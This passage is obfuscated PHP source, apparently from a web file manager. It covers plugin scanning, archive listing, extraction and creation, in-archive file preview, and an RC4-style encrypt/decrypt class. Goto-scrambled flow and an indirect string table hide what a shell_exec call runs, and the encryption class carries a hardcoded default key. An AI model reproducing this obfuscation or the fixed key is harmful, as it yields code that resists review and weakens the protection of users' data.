$DÙ±‰ö­øç = $this->loadList(); $this->pluginScan($DÙ±‰ö­øç); goto d¦ÉÍÒ„Ÿ‡; aéà„ŠÇ™Õ: } private function loadPluginList() { $FˆÇ‡òï’ =& $_SERVER[ì‹É]; $a‚‡—„ãË… = $this->loadList(); if (strtolower(MOD) == $FˆÇ‡òï’[2114]) { $C°ï‡¾–‹ = $a‚‡—„ãË…; } else { $C°ï‡¾–‹ = Hook::trigger($FˆÇ‡òï’[2115], $a‚‡—„ãË…); if (!$C°ï‡¾–‹) { die; } } return $C°ï‡¾–‹; } private function pluginScan($Câ£´†Ğ¢¦) { $A°œ©¥Ø×³ =& $_SERVER[ì‹É]; recursion_dir(PLUGIN_DIR, $C¯ß£ù¸‚, $e×‚©´ì†», 0); foreach ($C¯ß£ù¸‚ as $F‰ÎÓÚÌØå) { $fÂ÷«‚µÌ = get_path_this($F‰ÎÓÚÌØå); if (isset($Câ£´†Ğ¢¦[$fÂ÷«‚µÌ]) || !file_exists($F‰ÎÓÚÌØå . $A°œ©¥Ø×³[2116]) || !file_exists($F‰ÎÓÚÌØå . $A°œ©¥Ø×³[2107])) { continue; } Hook::apply($fÂ÷«‚µÌ . $A°œ©¥Ø×³[2110]); } } } goto CÚŞÚô¾ÆÍ; Aù¯×“à‹š: class KodArchive { static function init() { goto E¹çñŒôè£; d¨Ü¹ÚöæÜ: require_once ARCHIVE_LIB . $dÏªÁÓÌŠÒ[1808]; goto f×àñÃŸí; c¬¥§ªå: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $dÏªÁÓÌŠÒ[1803]; require_once ARCHIVE_LIB . $dÏªÁÓÌŠÒ[1804]; goto cè¸‡Á…à; E¹çñŒôè£: $dÏªÁÓÌŠÒ =& $_SERVER[ì‹É]; if (defined($dÏªÁÓÌŠÒ[1797])) { return; } define($dÏªÁÓÌŠÒ[1797], SDK_DIR . $dÏªÁÓÌŠÒ[1798]); goto D¥©Ô¼ß°¶; cè¸‡Á…à: require_once ARCHIVE_LIB . $dÏªÁÓÌŠÒ[1805]; require_once ARCHIVE_LIB . $dÏªÁÓÌŠÒ[1806]; require_once ARCHIVE_LIB . $dÏªÁÓÌŠÒ[1807]; goto d¨Ü¹ÚöæÜ; D¥©Ô¼ß°¶: define($dÏªÁÓÌŠÒ[1799], TEMP_FILES); define($dÏªÁÓÌŠÒ[1800], TEMP_FILES); define($dÏªÁÓÌŠÒ[1801], $dÏªÁÓÌŠÒ[1802]); goto c¬¥§ªå; f×àñÃŸí: } static function checkIfType($CÑ‰é†‘…©, $d¸ì¼àˆ—¨) { goto CÍ½ô¬Œä’; EÊóè§Šò’: $B—ÅÀÊº„İ = in_array($CÑ‰é†‘…©, $A® ÓÑ™Œ¿[$d¸ì¼àˆ—¨]); if ($B—ÅÀÊº„İ && ($d¸ì¼àˆ—¨ == $f™ãƒæ­ø®[298] || $d¸ì¼àˆ—¨ == $f™ãƒæ­ø®[1812]) && (!function_exists($f™ãƒæ­ø®[1820]) || !function_exists($f™ãƒæ­ø®[1821]))) { show_tips($f™ãƒæ­ø®[1822]); } if ($B—ÅÀÊº„İ && $d¸ì¼àˆ—¨ == $f™ãƒæ­ø®[1019] && (!function_exists($f™ãƒæ­ø®[1823]) || !strstr(shell_exec($f™ãƒæ­ø®[1824]), $f™ãƒæ­ø®[1825]))) { show_tips($f™ãƒæ­ø®[1826]); } goto f²ÒÎ¾Şï; f²ÒÎ¾Şï: return $B—ÅÀÊº„İ; goto E‰ßÓ‰‰É; CÍ½ô¬Œä’: $f™ãƒæ­ø® =& $_SERVER[ì‹É]; self::init(); $A® ÓÑ™Œ¿ = array($f™ãƒæ­ø®[298] => array($f™ãƒæ­ø®[298], $f™ãƒæ­ø®[1809], $f™ãƒæ­ø®[1810], $f™ãƒæ­ø®[1811]), $f™ãƒæ­ø®[1812] => array($f™ãƒæ­ø®[1812], $f™ãƒæ­ø®[1813], $f™ãƒæ­ø®[1017], $f™ãƒæ­ø®[1015]), $f™ãƒæ­ø®[1019] => array($f™ãƒæ­ø®[1019], $f™ãƒæ­ø®[1814], $f™ãƒæ­ø®[1815], $f™ãƒæ­ø®[1816], $f™ãƒæ­ø®[1817], $f™ãƒæ­ø®[1818], $f™ãƒæ­ø®[1819])); goto EÊóè§Šò’; E‰ßÓ‰‰É: } static function listContent($dæÕÒ™á‡Œ, $B‡ùªÈÊøƒ = true) { $Bƒ¢¥Ğİøƒ =& $_SERVER[ì‹É]; self::init(); $Aª®·†¯ = !empty($GLOBALS[$Bƒ¢¥Ğİøƒ[1023]]) ? $GLOBALS[$Bƒ¢¥Ğİøƒ[1023]] : get_path_ext($dæÕÒ™á‡Œ); $F©øÈŒ…î¥ = !1; if (self::checkIfType($Aª®·†¯, $Bƒ¢¥Ğİøƒ[1812])) { $aÒ¬ÜœêÖÈ = PclTarList($dæÕÒ™á‡Œ, $Aª®·†¯); $F©øÈŒ…î¥ = array(); for ($d‹²¤–ã¾Ì = 0; $d‹²¤–ã¾Ì < count($aÒ¬ÜœêÖÈ); $d‹²¤–ã¾Ì++) { $CÖµô¥¨¨¤ = $aÒ¬ÜœêÖÈ[$d‹²¤–ã¾Ì]; if ($CÖµô¥¨¨¤[$Bƒ¢¥Ğİøƒ[1827]] == $Bƒ¢¥Ğİøƒ[1828] || $CÖµô¥¨¨¤[$Bƒ¢¥Ğİøƒ[1827]] == $Bƒ¢¥Ğİøƒ[1829]) { continue; } if ($B‡ùªÈÊøƒ) { $CÖµô¥¨¨¤[$Bƒ¢¥Ğİøƒ[1830]] = ltrim($CÖµô¥¨¨¤[$Bƒ¢¥Ğİøƒ[1830]], $Bƒ¢¥Ğİøƒ[1119]); } if ($CÖµô¥¨¨¤[$Bƒ¢¥Ğİøƒ[1827]] == $Bƒ¢¥Ğİøƒ[1831]) { $CÖµô¥¨¨¤[$Bƒ¢¥Ğİøƒ[77]] = !0; } else { $CÖµô¥¨¨¤[$Bƒ¢¥Ğİøƒ[77]] = !1; } $CÖµô¥¨¨¤[$Bƒ¢¥Ğİøƒ[1010]] = $d‹²¤–ã¾Ì; $F©øÈŒ…î¥[] = $CÖµô¥¨¨¤; } } else { if (self::checkIfType($Aª®·†¯, $Bƒ¢¥Ğİøƒ[1019])) { $fï¬ÙšÇ = kodRarArchive::listContent($dæÕÒ™á‡Œ); if (!$fï¬ÙšÇ[$Bƒ¢¥Ğİøƒ[1006]]) { return $fï¬ÙšÇ; } else { $F©øÈŒ…î¥ = $fï¬ÙšÇ[$Bƒ¢¥Ğİøƒ[1008]]; } } else { if (kodZipArchive::support($Bƒ¢¥Ğİøƒ[350])) { $F©øÈŒ…î¥ = kodZipArchive::listContent($dæÕÒ™á‡Œ); } else { $e‚—†®¤•‰ = new PclZip($dæÕÒ™á‡Œ); $F©øÈŒ…î¥ = $e‚—†®¤•‰->listContent(); } } } if ($F©øÈŒ…î¥) { $Fµ’›‡ÈÚ = unzip_charset_get($F©øÈŒ…î¥); $B‡ùªÈÊøƒ = $B‡ùªÈÊøƒ && function_exists($Bƒ¢¥Ğİøƒ[66]); for ($d‹²¤–ã¾Ì = 0; $d‹²¤–ã¾Ì < count($F©øÈŒ…î¥); $d‹²¤–ã¾Ì++) { $F©øÈŒ…î¥[$d‹²¤–ã¾Ì][$Bƒ¢¥Ğİøƒ[1830]] = str_replace(array($Bƒ¢¥Ğİøƒ[1046], $Bƒ¢¥Ğİøƒ[1832]), $Bƒ¢¥Ğİøƒ[766], $F©øÈŒ…î¥[$d‹²¤–ã¾Ì][$Bƒ¢¥Ğİøƒ[1830]]); if ($B‡ùªÈÊøƒ) { $F©øÈŒ…î¥[$d‹²¤–ã¾Ì][$Bƒ¢¥Ğİøƒ[1830]] = iconv_to($F©øÈŒ…î¥[$d‹²¤–ã¾Ì][$Bƒ¢¥Ğİøƒ[1830]], $Fµ’›‡ÈÚ, $Bƒ¢¥Ğİøƒ[323]); unset($F©øÈŒ…î¥[$d‹²¤–ã¾Ì][$Bƒ¢¥Ğİøƒ[1833]]); } } return array($Bƒ¢¥Ğİøƒ[1006] => !0, $Bƒ¢¥Ğİøƒ[1008] => $F©øÈŒ…î¥); } else { return array($Bƒ¢¥Ğİøƒ[1006] => !1, $Bƒ¢¥Ğİøƒ[1008] => $F©øÈŒ…î¥); } } static function extract($FŠˆöÀ–Ó, $a‡Ä´ŠÜŒÍ, $CŒˆÏŠÇ­Œ = "\55\61", &$EÚé§˜øÒğ = false) { goto c¸šºä‡Ìæ; e©ˆ‚ì„: if (self::checkIfType($cƒ•æ‹Ç, $EŞ£¤îšË[1812])) { if ($CŒˆÏŠÇ­Œ != $EŞ£¤îšË[1005]) { $Eëåˆ–íˆ = unzip_pre_name($Eëåˆ–íˆ); $f÷á„ˆ†¬ = unzip_pre_name($f÷á„ˆ†¬); $cÈĞÄ ùÙ· = PclTarExtractList($FŠˆöÀ–Ó, array($Eëåˆ–íˆ), $a‡Ä´ŠÜŒÍ, $f÷á„ˆ†¬, $cƒ•æ‹Ç); } else { $cÈĞÄ ùÙ· = PclTarExtract($FŠˆöÀ–Ó, $a‡Ä´ŠÜŒÍ, $EŞ£¤îšË[358], $cƒ•æ‹Ç); } return array($EŞ£¤îšË[1006] => $cÈĞÄ ùÙ·, $EŞ£¤îšË[1008] => PclErrorString(!0)); } else { if (self::checkIfType($cƒ•æ‹Ç, $EŞ£¤îšË[1019])) { return kodRarArchive::extract($FŠˆöÀ–Ó, $a‡Ä´ŠÜŒÍ, $cƒ•æ‹Ç, $EÚé§˜øÒğ); } else { if (kodZipArchive::support($EŞ£¤îšË[1834])) { return kodZipArchive::extract($FŠˆöÀ–Ó, $a‡Ä´ŠÜŒÍ, $EÚé§˜øÒğ); } else { $Aó»º‚®ŞÈ = new PclZip($FŠˆöÀ–Ó); if ($CŒˆÏŠÇ­Œ != $EŞ£¤îšË[1005]) { $cÈĞÄ ùÙ· = $Aó»º‚®ŞÈ->extract(PCLZIP_OPT_PATH, $a‡Ä´ŠÜŒÍ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $EŞ£¤îšË[1835], PCLZIP_OPT_BY_NAME, $Eö÷øÁ’´¿[$EŞ£¤îšË[1830]], PCLZIP_OPT_REMOVE_PATH, $f÷á„ˆ†¬, PCLZIP_OPT_REPLACE_NEWER); } else { $cÈĞÄ ùÙ· = $Aó»º‚®ŞÈ->extract(PCLZIP_OPT_PATH, $a‡Ä´ŠÜŒÍ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $EŞ£¤îšË[1835], PCLZIP_OPT_REPLACE_NEWER); } return array($EŞ£¤îšË[1006] => $cÈĞÄ ùÙ·, $EŞ£¤îšË[1008] => $Aó»º‚®ŞÈ->errorName(!0)); } } } return array($EŞ£¤îšË[1006] => !1, $EŞ£¤îšË[1008] => $EŞ£¤îšË[1836]); goto CšÅ×²ÛÚŸ; fÕÆŒŸÕœ®: $cùØÆËŞµâ = self::listContent($FŠˆöÀ–Ó, !1); if (!$cùØÆËŞµâ[$EŞ£¤îšË[1006]]) { return $cùØÆËŞµâ; } if ($CŒˆÏŠÇ­Œ != $EŞ£¤îšË[1005]) { goto fŒïŞÕ¼; AÙ¹»İ–’ì: if ($Eö÷øÁ’´¿[$EŞ£¤îšË[77]]) { $Eëåˆ–íˆ = rtrim($Eëåˆ–íˆ, $EŞ£¤îšË[8]) . $EŞ£¤îšË[8]; $EÚé§˜øÒğ = array($EÚé§˜øÒğ); } $b¡°ÓéÏÈ· = str_replace($EŞ£¤îšË[96], $EŞ£¤îšË[8], $Eëåˆ–íˆ); if (substr($b¡°ÓéÏÈ·, -1) == $EŞ£¤îšË[8]) { if (!strstr(trim($b¡°ÓéÏÈ·, $EŞ£¤îšË[8]), $EŞ£¤îšË[8])) { $a‡Ä´ŠÜŒÍ = $a‡Ä´ŠÜŒÍ . get_path_this($b¡°ÓéÏÈ·) . $EŞ£¤îšË[8]; } } else { if ($f÷á„ˆ†¬ == $Eëåˆ–íˆ) { $f÷á„ˆ†¬ = $EŞ£¤îšË[33]; } } goto BöÛì‡çÆª; d‚²öŠ‘Ó: if ($GLOBALS[$EŞ£¤îšË[6]][$EŞ£¤îšË[1117]] != $EŞ£¤îšË[323]) { $Eëåˆ–íˆ = unzip_pre_name($EÚé§˜øÒğ); } $f÷á„ˆ†¬ = get_path_father($EÚé§˜øÒğ); if ($f÷á„ˆ†¬ == $EÚé§˜øÒğ) { $f÷á„ˆ†¬ = $EŞ£¤îšË[33]; } goto AÙ¹»İ–’ì; fŒïŞÕ¼: $Eö÷øÁ’´¿ = self::fileIndex($cùØÆËŞµâ[$EŞ£¤îšË[1008]], $CŒˆÏŠÇ­Œ); $EÚé§˜øÒğ = str_replace(array($EŞ£¤îšË[1046], $EŞ£¤îšË[1832]), $EŞ£¤îšË[71], $Eö÷øÁ’´¿[$EŞ£¤îšË[1830]]); $Eëåˆ–íˆ = $EÚé§˜øÒğ; goto d‚²öŠ‘Ó; BöÛì‡çÆª: } goto e©ˆ‚ì„; c¸šºä‡Ìæ: $EŞ£¤îšË =& $_SERVER[ì‹É]; self::init(); $cƒ•æ‹Ç = !empty($GLOBALS[$EŞ£¤îšË[1023]]) ? $GLOBALS[$EŞ£¤îšË[1023]] : get_path_ext($FŠˆöÀ–Ó); goto fÕÆŒŸÕœ®; CšÅ×²ÛÚŸ: } static function fileIndex($a¿ìÉÄ‘ôğ, $d…ğ’ß‹ğ, $Eá¸÷“ÁÇÛ = false) { goto Fƒ¥áŠ˜ø‚; Dò·¹Áççí: $aäç‘ø¹ïæ = count($a¿ìÉÄ‘ôğ); for ($e‚›­¢Ë‰ = 0; $e‚›­¢Ë‰ < $aäç‘ø¹ïæ; $e‚›­¢Ë‰++) { if ($d…ğ’ß‹ğ == $a¿ìÉÄ‘ôğ[$e‚›­¢Ë‰][$Bö™ ¶äà[1010]]) { $eÜÙŞ¾Ş‘ = $a¿ìÉÄ‘ôğ[$e‚›­¢Ë‰]; break; } } if (!$eÜÙŞ¾Ş‘) { show_tips($Bö™ ¶äà[1837]); } goto EÊĞÇ°ĞÊÕ; EÊĞÇ°ĞÊÕ: $Eğ¡é”‡Ù = $eÜÙŞ¾Ş‘; if ($Eá¸÷“ÁÇÛ) { $Eğ¡é”‡Ù = $eÜÙŞ¾Ş‘[$Eá¸÷“ÁÇÛ]; if ($eÜÙŞ¾Ş‘[$Bö™ ¶äà[77]]) { $Eğ¡é”‡Ù = rtrim($Eğ¡é”‡Ù, $Bö™ ¶äà[8]) . $Bö™ ¶äà[8]; } } return $Eğ¡é”‡Ù; goto FÏàÓ×öè¼; Fƒ¥áŠ˜ø‚: $Bö™ ¶äà =& $_SERVER[ì‹É]; self::init(); if (!is_array($a¿ìÉÄ‘ôğ)) { return !1; } goto Dò·¹Áççí; FÏàÓ×öè¼: } static function extractZipFile($B°äèŸ¢ÓÒ, $b½±êßõ¦, $E‹šğÂÌá = false) { goto bİŒ­½„±¦; A‡Åä¨çÅ: if (!file_exists($AòÚÄÂÑêº)) { return !1; } @rename($AòÚÄÂÑêº, $F×È…¯ô‘); return $F×È…¯ô‘; goto Fˆƒ•íæ; bİŒ­½„±¦: $FÆ‹‚ˆµ•â =& $_SERVER[ì‹É]; self::init(); $fõ‰ºÓ™à = TEMP_FILES . hash_path($B°äèŸ¢ÓÒ) . $FÆ‹‚ˆµ•â[8]; goto F›Èà¶Ã´•; BŠ¿ê¢‰¶ì: if (file_exists($F×È…¯ô‘)) { return $F×È…¯ô‘; } $Eö¼ÓÒ›±á = new PclZip($B°äèŸ¢ÓÒ); $AòÚÄÂÑêº = unzip_filter_ext($fõ‰ºÓ™à . get_path_this($b½±êßõ¦)); goto dï‹¾¦¼¸Ø; dï‹¾¦¼¸Ø: $F£ø†äŒƒµ = get_path_father($b½±êßõ¦); if ($F£ø†äŒƒµ == $b½±êßõ¦) { $F£ø†äŒƒµ = $FÆ‹‚ˆµ•â[33]; } $f ±‹ˆ°¯ = $Eö¼ÓÒ›±á->extract(PCLZIP_OPT_PATH, $fõ‰ºÓ™à, PCLZIP_CB_PRE_FILE_NAME, $FÆ‹‚ˆµ•â[1835], PCLZIP_OPT_REMOVE_PATH, $F£ø†äŒƒµ, PCLZIP_OPT_BY_NAME, $b½±êßõ¦); goto A‡Åä¨çÅ; F›Èà¶Ã´•: mk_dir($fõ‰ºÓ™à); $F×È…¯ô‘ = $fõ‰ºÓ™à . md5($B°äèŸ¢ÓÒ . $b½±êßõ¦); if ($E‹šğÂÌá) { $F×È…¯ô‘ = $fõ‰ºÓ™à . $E‹šğÂÌá; } goto BŠ¿ê¢‰¶ì; Fˆƒ•íæ: } static function filePreview($FÛ¦“¹ó, $C¸³œœğÉ, $fÓ¬ÜºêêÛ = false, $A­ğ›‰‘ÆÒ = false) { goto f¥Ì¤†”Ğì; CŸóÀ…ôŸ: mk_dir($aÍ·•äºöÅ); $cëóİ¨¤§” = $aÍ·•äºöÅ . md5($FÛ¦“¹ó . $C¸³œœğÉ . $A­ğ›‰‘ÆÒ); $c§¤š„•‘ = $E†»‹–À‹“[33]; goto e…›Âå”ˆ‡; B±õó«­õÜ: $c§¤š„•‘ = unzip_pre_name($c§¤š„•‘); $BÂŞ”ã†¨Š = get_path_this($c§¤š„•‘); $fŒ…Æ¸Å® = unzip_filter_ext($aÍ·•äºöÅ . $BÂŞ”ã†¨Š); goto C¢¿‘˜††¢; f¥Ì¤†”Ğì: $E†»‹–À‹“ =& $_SERVER[ì‹É]; self::init(); $aÍ·•äºöÅ = TEMP_FILES . hash_path($FÛ¦“¹ó) . $E†»‹–À‹“[8]; goto CŸóÀ…ôŸ; C¢¿‘˜††¢: if (!$bˆîñèõàó[$E†»‹–À‹“[1006]]) { show_json($bˆîñèõàó[$E†»‹–À‹“[1008]], !1); } if (!file_exists($fŒ…Æ¸Å®)) { show_json($E†»‹–À‹“[1839], !1); } @rename($fŒ…Æ¸Å®, $cëóİ¨¤§”); goto f„…¤ß‰; f„…¤ß‰: if (!file_exists($cëóİ¨¤§”)) { del_dir($aÍ·•äºöÅ); show_json($E†»‹–À‹“[1840]); } IO::fileOut($cëóİ¨¤§”, $fÓ¬ÜºêêÛ, $BÂŞ”ã†¨Š); goto Aâ¿’·Œ½; e…›Âå”ˆ‡: $bˆîñèõàó = self::extract($FÛ¦“¹ó, $aÍ·•äºöÅ, $C¸³œœğÉ, $c§¤š„•‘); if (is_array($c§¤š„•‘)) { show_json($E†»‹–À‹“[1838], !1); } if (file_exists($cëóİ¨¤§”)) { IO::fileOut($cëóİ¨¤§”, $fÓ¬ÜºêêÛ, get_path_this($c§¤š„•‘)); return; } goto B±õó«­õÜ; Aâ¿’·Œ½: } static function create($EéÃŞ”´öå, $AóÙ·‚Í„Ò) { $F¹¸µîîÁ„ =& $_SERVER[ì‹É]; self::init(); $bÆ’ÂŒ‡¼ = get_path_ext($EéÃŞ”´öå); $F–†°§Ô¾• = !1; if (self::checkIfType($bÆ’ÂŒ‡¼, $F¹¸µîîÁ„[298])) { if (kodZipArchive::support($F¹¸µîîÁ„[983])) { return kodZipArchive::create($EéÃŞ”´öå, $AóÙ·‚Í„Ò); } $fåõäŠ·’º = new PclZip($EéÃŞ”´öå); foreach ($AóÙ·‚Í„Ò as $e¡Ğä–ª÷Ğ => $Eå§Òğ´¬Ã) { $Eå§Òğ´¬Ã = str_replace($F¹¸µîîÁ„[463], $F¹¸µîîÁ„[8], $Eå§Òğ´¬Ã); $AºÀ¼™ô‘¯ = Kodio::clear(get_path_father($Eå§Òğ´¬Ã)); if ($e¡Ğä–ª÷Ğ == 0) { $F–†°§Ô¾• = $fåõäŠ·’º->create($Eå§Òğ´¬Ã, PCLZIP_OPT_REMOVE_PATH, $AºÀ¼™ô‘¯, PCLZIP_CB_PRE_FILE_NAME, $F¹¸µîîÁ„[1841]); continue; } $F–†°§Ô¾• = $fåõäŠ·’º->add($Eå§Òğ´¬Ã, PCLZIP_OPT_REMOVE_PATH, $AºÀ¼™ô‘¯, PCLZIP_CB_PRE_FILE_NAME, $F¹¸µîîÁ„[1841]); } } else { if (self::checkIfType($bÆ’ÂŒ‡¼, $F¹¸µîîÁ„[1812])) { foreach ($AóÙ·‚Í„Ò as $e¡Ğä–ª÷Ğ => $Eå§Òğ´¬Ã) { $Eå§Òğ´¬Ã = str_replace($F¹¸µîîÁ„[463], $F¹¸µîîÁ„[8], $Eå§Òğ´¬Ã); $AºÀ¼™ô‘¯ = Kodio::clear(get_path_father($Eå§Òğ´¬Ã)); if ($e¡Ğä–ª÷Ğ == 0) { $F–†°§Ô¾• = PclTarCreate($EéÃŞ”´öå, array($Eå§Òğ´¬Ã), $bÆ’ÂŒ‡¼, null, $AºÀ¼™ô‘¯); continue; } $F–†°§Ô¾• = PclTarAddList($EéÃŞ”´öå, array($Eå§Òğ´¬Ã), $F¹¸µîîÁ„[33], $AºÀ¼™ô‘¯, $bÆ’ÂŒ‡¼); } } } return $F–†°§Ô¾•; } } class Mcrypt { public static $defaultKey = "\x61\41\x74\141\153\x41\x3a\x64\x6c\155\143\x6c\144\105\166\x2c\145"; public static function encode($C„ƒ©Î»æ«, $d©ªíµÌ‰ = '', $dŒ Íö÷¯ä = 0, $C÷ÒÔëàç = '') { goto C§áãÌÀ–ã; CÆœ¬¿Ü¢‡: $C„ƒ©Î»æ« = sprintf($E›—‡Ÿ¨ø²[1842], $dŒ Íö÷¯ä ? $dŒ Íö÷¯ä + time() : 0) . substr(md5($C„ƒ©Î»æ« . $A–§Òê¯Ïì), 0, 16) . $C„ƒ©Î»æ«; $eœºËÇîå = strlen($C„ƒ©Î»æ«); $C¤ÌÎÎˆˆ™ = array(); goto b°¿ù·óÕå; b°¿ù·óÕå: for ($AËß´ƒ¯è = 0; $AËß´ƒ¯è <= 255; $AËß´ƒ¯è++) { $C¤ÌÎÎˆˆ™[$AËß´ƒ¯è] = ord($b›®°Ôƒò‚[$AËß´ƒ¯è % $fÉÆ›”Óõ›]); } $b‚‚–ó½Ñï = range(0, 255); for ($cŠ·ÔØ‘ = $AËß´ƒ¯è = 0; $AËß´ƒ¯è < 256; $AËß´ƒ¯è++) { $cŠ·ÔØ‘ = ($cŠ·ÔØ‘ + $b‚‚–ó½Ñï[$AËß´ƒ¯è] + $C¤ÌÎÎˆˆ™[$AËß´ƒ¯è]) % 256; $aà‰¸†½Ñ = $b‚‚–ó½Ñï[$AËß´ƒ¯è]; $b‚‚–ó½Ñï[$AËß´ƒ¯è] = $b‚‚–ó½Ñï[$cŠ·ÔØ‘]; $b‚‚–ó½Ñï[$cŠ·ÔØ‘] = $aà‰¸†½Ñ; } goto E…¶›¾Ÿ¬²; C§áãÌÀ–ã: $E›—‡Ÿ¨ø² =& $_SERVER[ì‹É]; $eƒ°Œà‚Ä = 4; $d©ªíµÌ‰ = md5($d©ªíµÌ‰ ? $d©ªíµÌ‰ : self::$defaultKey); goto f†Á‰·˜’¨; E…¶›¾Ÿ¬²: $c»À”ößÊŒ = $E›—‡Ÿ¨ø²[33]; for ($aÆ Ãœ“ÅË = $cŠ·ÔØ‘ = $AËß´ƒ¯è = 0; $AËß´ƒ¯è < $eœºËÇîå; $AËß´ƒ¯è++) { $aÆ Ãœ“ÅË = ($aÆ Ãœ“ÅË + 1) % 256; $cŠ·ÔØ‘ = ($cŠ·ÔØ‘ + $b‚‚–ó½Ñï[$aÆ Ãœ“ÅË]) % 256; $aà‰¸†½Ñ = $b‚‚–ó½Ñï[$aÆ Ãœ“ÅË]; $b‚‚–ó½Ñï[$aÆ Ãœ“ÅË] = $b‚‚–ó½Ñï[$cŠ·ÔØ‘]; $b‚‚–ó½Ñï[$cŠ·ÔØ‘] = $aà‰¸†½Ñ; $c»À”ößÊŒ .= chr(ord($C„ƒ©Î»æ«[$AËß´ƒ¯è]) ^ $b‚‚–ó½Ñï[($b‚‚–ó½Ñï[$aÆ Ãœ“ÅË] + $b‚‚–ó½Ñï[$cŠ·ÔØ‘]) % 256]); } $c»À”ößÊŒ = $fÉ™ŠÕ®îï . str_replace($E›—‡Ÿ¨ø²[904], $E›—‡Ÿ¨ø²[33], base64_encode($c»À”ößÊŒ)); goto e³±œŸà³Â; e³±œŸà³Â: $c»À”ößÊŒ = str_replace(array($E›—‡Ÿ¨ø²[281], $E›—‡Ÿ¨ø²[8], $E›—‡Ÿ¨ø²[904]), array($E›—‡Ÿ¨ø²[408], $E›—‡Ÿ¨ø²[71], $E›—‡Ÿ¨ø²[94]), $c»À”ößÊŒ); return $c»À”ößÊŒ; goto A†´¦àšæ; f†Á‰·˜’¨: $AÃ‚³ÅÈ¾¯ = md5(substr($d©ªíµÌ‰, 0, 16)); $A–§Òê¯Ïì = md5(substr($d©ªíµÌ‰, 16, 16)); $C÷ÒÔëàç = $C÷ÒÔëàç ? $C÷ÒÔëàç : md5(microtime()); goto FÀôÉ’‰ãá; FÀôÉ’‰ãá: $fÉ™ŠÕ®îï = substr($C÷ÒÔëàç, -$eƒ°Œà‚Ä); $b›®°Ôƒò‚ = $AÃ‚³ÅÈ¾¯ . md5($AÃ‚³ÅÈ¾¯ . $fÉ™ŠÕ®îï); $fÉÆ›”Óõ› = strlen($b›®°Ôƒò‚); goto CÆœ¬¿Ü¢‡; A†´¦àšæ: } public static function decode($F·‘ñŒ†ÊÄ, $dãã’Ñ•Õã = '') { goto EÛê¶ÀÓ½; eÉñåã‚Ï: $e„Õ†„Ä = $cÖÜ½åÃ“[33]; for ($FêËùİÁ¬˜ = $F°áÂ…Ìºó = $Dõ’‡Œ¯†ë = 0; $Dõ’‡Œ¯†ë < $bêˆ»•Æ‹·; $Dõ’‡Œ¯†ë++) { $FêËùİÁ¬˜ = ($FêËùİÁ¬˜ + 1) % 256; $F°áÂ…Ìºó = ($F°áÂ…Ìºó + $Aµ¼Ïáå’‘[$FêËùİÁ¬˜]) % 256; $EëÎ“‡¥‘ = $Aµ¼Ïáå’‘[$FêËùİÁ¬˜]; $Aµ¼Ïáå’‘[$FêËùİÁ¬˜] = $Aµ¼Ïáå’‘[$F°áÂ…Ìºó]; $Aµ¼Ïáå’‘[$F°áÂ…Ìºó] = $EëÎ“‡¥‘; $e„Õ†„Ä .= chr(ord($F·‘ñŒ†ÊÄ[$Dõ’‡Œ¯†ë]) ^ $Aµ¼Ïáå’‘[($Aµ¼Ïáå’‘[$FêËùİÁ¬˜] + $Aµ¼Ïáå’‘[$F°áÂ…Ìºó]) % 256]); } if ((substr($e„Õ†„Ä, 0, 10) == 0 || substr($e„Õ†„Ä, 0, 10) - time() > 0) && substr($e„Õ†„Ä, 10, 16) == substr(md5(substr($e„Õ†„Ä, 26) . $d‰Â›´), 0, 16)) { return substr($e„Õ†„Ä, 26); } else { return $cÖÜ½åÃ“[33]; } goto cô¢óï°íÁ; EÛê¶ÀÓ½: $cÖÜ½åÃ“ =& $_SERVER[ì‹É]; $F·‘ñŒ†ÊÄ = str_replace(array($cÖÜ½åÃ“[408], $cÖÜ½åÃ“[71], $cÖÜ½åÃ“[94]), array($cÖÜ½åÃ“[281], $cÖÜ½åÃ“[8], $cÖÜ½åÃ“[904]), $F·‘ñŒ†ÊÄ); $b™·ÏŸØÊ = 4; goto C ¤¬õî´ó; A£°›Ğƒ·í: $F·‘ñŒ†ÊÄ = base64_decode(substr($F·‘ñŒ†ÊÄ, $b™·ÏŸØÊ)); $bêˆ»•Æ‹· = strlen($F·‘ñŒ†ÊÄ); $C Ô”©¡‡ = array(); goto EÌ‹ëÑ•ñÇ; EÌ‹ëÑ•ñÇ: for ($Dõ’‡Œ¯†ë = 0; $Dõ’‡Œ¯†ë <= 255; $Dõ’‡Œ¯†ë++) { $C Ô”©¡‡[$Dõ’‡Œ¯†ë] = ord($aªÀÔ“ØšŒ[$Dõ’‡Œ¯†ë % $EËİ’—‘Š]); } $Aµ¼Ïáå’‘ = range(0, 255); for ($F°áÂ…Ìºó = $Dõ’‡Œ¯†ë = 0; $Dõ’‡Œ¯†ë < 256; $Dõ’‡Œ¯†ë++) { $F°áÂ…Ìºó = ($F°áÂ…Ìºó + $Aµ¼Ïáå’‘[$Dõ’‡Œ¯†ë] + $C Ô”©¡‡[$Dõ’‡Œ¯†ë]) % 256; $EëÎ“‡¥‘ = $Aµ¼Ïáå’‘[$Dõ’‡Œ¯†ë]; $Aµ¼Ïáå’‘[$Dõ’‡Œ¯†ë] = $Aµ¼Ïáå’‘[$F°áÂ…Ìºó]; $Aµ¼Ïáå’‘[$F°áÂ…Ìºó] = $EëÎ“‡¥‘; } goto eÉñåã‚Ï; B¿Öˆ©¹™±: $A†–Š›ßî¡ = substr($F·‘ñŒ†ÊÄ, 0, $b™·ÏŸØÊ); $aªÀÔ“ØšŒ = $c»©Ê¢ˆÊ¬ . md5($c»©Ê¢ˆÊ¬ . $A†–Š›ßî¡); $EËİ’—‘Š = strlen($aªÀÔ“ØšŒ); goto A£°›Ğƒ·í; C ¤¬õî´ó: $dãã’Ñ•Õã = md5($dãã’Ñ•Õã ? $dãã’Ñ•Õã : self::$defaultKey); $c»©Ê¢ˆÊ¬ = md5(substr($dãã’Ñ•Õã, 0, 16)); $d‰Â›´ = md5(substr($dãã’Ñ•Õã, 16, 16)); goto B¿Öˆ©¹™±; cô¢óï°íÁ: } } define($_SERVER[ì‹É][1843], 1); goto b¹ËÍ‚ÙÜÚ; A½â–¡’ã: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto BŸõ‰øĞç‘; cø¥ÔŸˆ˜²: if (!$DÓœÂ¥ìÍ[$aßƒäòˆ¾°[1248]]) { $DÓœÂ¥ìÍ[$aßƒäòˆ¾°[1248]] = 